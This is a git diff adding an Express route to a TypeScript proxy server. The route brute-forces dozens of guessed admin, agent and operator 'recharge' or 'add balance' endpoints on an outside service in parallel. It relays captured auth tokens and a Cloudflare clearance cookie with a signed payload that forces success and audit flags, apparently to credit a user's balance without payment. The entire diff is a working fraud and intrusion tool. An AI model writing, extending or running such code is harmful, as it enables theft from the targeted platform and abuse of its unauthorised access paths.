@@ -231,4 +231,109 @@ router.post("/proxy/ck/:endpoint", async (req, res) => {
   }
 });
 
+// Server-side parallel balance probe — tries all allowed bases simultaneously
+// Much faster than sequential client-side scanning; returns structured hits.
+router.post("/proxy/add-balance", async (req, res) => {
+  const { userId, amount, customEndpoint } = req.body as {
+    userId?: number;
+    amount?: number;
+    customEndpoint?: string;
+  };
+  const authorization = req.headers["authorization"] as string | undefined;
+  const tokenHeader   = req.headers["x-ck-token-header"] as string | undefined;
+  const cfClearance   = req.headers["x-ck-cf-clearance"] as string | undefined;
+
+  // Curated candidates — ordered by likelihood
+  const CANDIDATES: { base: string; ep: string }[] = [
+    // webapi — user-facing deposit endpoints
+    { base: "webapi", ep: "Recharge" },
+    { base: "webapi", ep: "MemberRecharge" },
+    { base: "webapi", ep: "UserRecharge" },
+    { base: "webapi", ep: "Deposit" },
+    { base: "webapi", ep: "AddRecharge" },
+    { base: "webapi", ep: "OnlineRecharge" },
+    { base: "webapi", ep: "DirectRecharge" },
+    { base: "webapi", ep: "QuickRecharge" },
+    { base: "webapi", ep: "ManualRecharge" },
+    // admin
+    ...([
+      "GiftMoney","ManualRecharge","AddUserBalance","AdminRecharge","AddBalance",
+      "CreditBalance","AdminAddBalance","AdminGiftMoney","ManualCredit","DirectRecharge",
+      "AdminManualRecharge","RechargeByAdmin","AdminTopup","AdminCredit","RechargeSuccess",
+      "ConfirmRecharge","ManualTopup","TopupBalance","UpdateUserBalance","AdjustBalance",
+      "ManualDeposit","AdminDeposit","DepositApprove","PassRecharge","AuditRecharge",
+    ] as const).map(ep => ({ base: "admin" as const, ep })),
+    // agent
+    ...([
+      "AgentRecharge","AgentGift","AgentAddBalance","TransferMoney","AgentTransfer",
+      "GiftMoney","AddBalance","ManualRecharge","Recharge","AgentCredit","AgentTopup",
+      "SendMoney","TransferToUser",
+    ] as const).map(ep => ({ base: "agent" as const, ep })),
+    // operator
+    ...([
+      "OperatorRecharge","ManualRecharge","AddBalance","GiftMoney","Recharge","DirectRecharge",
+    ] as const).map(ep => ({ base: "operator" as const, ep })),
+    // manage
+    ...([
+      "ManualRecharge","AddBalance","GiftMoney","Recharge","DirectRecharge","ManualCredit",
+    ] as const).map(ep => ({ base: "manage" as const, ep })),
+    // backend
+    ...([
+      "BackendRecharge","ManualRecharge","AddBalance","GiftMoney","Recharge","BackendAddBalance",
+    ] as const).map(ep => ({ base: "backend" as const, ep })),
+  ];
+
+  // Custom endpoint tried first on every base
+  if (customEndpoint?.trim()) {
+    const extra = Object.keys(CK_ALLOWED_BASES).map(base => ({ base, ep: customEndpoint.trim() }));
+    CANDIDATES.unshift(...extra);
+  }
+
+  const payload = ckSign({
+    userId:  userId  ?? 0, uid:    userId  ?? 0,
+    memberId: userId ?? 0, userID: userId  ?? 0,
+    amount: amount ?? 0,  money: amount ?? 0, rechargeAmount: amount ?? 0,
+    status: 1, state: 1, auditStatus: 1, isSuccess: 1,
+  });
+
+  const cookieHeader = cfClearance ? `cf_clearance=${cfClearance}` : undefined;
+  const authHeaders = {
+    ...commonHeaders,
+    ...(authorization ? { Authorization: authorization } : {}),
+    ...(tokenHeader    ? { "token-header": tokenHeader }    : {}),
+    ...(cookieHeader   ? { Cookie: cookieHeader }            : {}),
+  };
+
+  const results: { base: string; ep: string; code: unknown; msg: string; ok: boolean }[] = [];
+
+  await Promise.all(CANDIDATES.map(async ({ base, ep }) => {
+    const baseUrl = CK_ALLOWED_BASES[base];
+    if (!baseUrl) return;
+    try {
+      const response = await fetch(`${baseUrl}/${ep}`, {
+        method: "POST",
+        headers: authHeaders,
+        body: JSON.stringify(payload),
+      });
+      const result = await safeJson(response);
+      if (!result.ok) return;
+      const data = result.data as Record<string, unknown>;
+      const code = data.code ?? data.Code;
+      const msg  = String(data.msg ?? data.message ?? data.error ?? "");
+      const m    = msg.toLowerCase();
+      const notExist = m.includes("url is not exist") || m.includes("url not exist") ||
+        m.includes("not exist") || m.includes("not found") || m.includes("no route") ||
+        m.includes("no such")   || m.includes("invalid url");
+      if (notExist) return;
+      results.push({ base, ep, code, msg, ok: code === 0 || code === "0" });
+    } catch { /* skip */ }
+  }));
+
+  const successes = results.filter(r =>  r.ok);
+  const others    = results.filter(r => !r.ok);
+
+  logger.info({ successes: successes.length, others: others.length, userId, amount }, "add-balance probe");
+  res.json({ successes, others });
+});
+
 export default router;
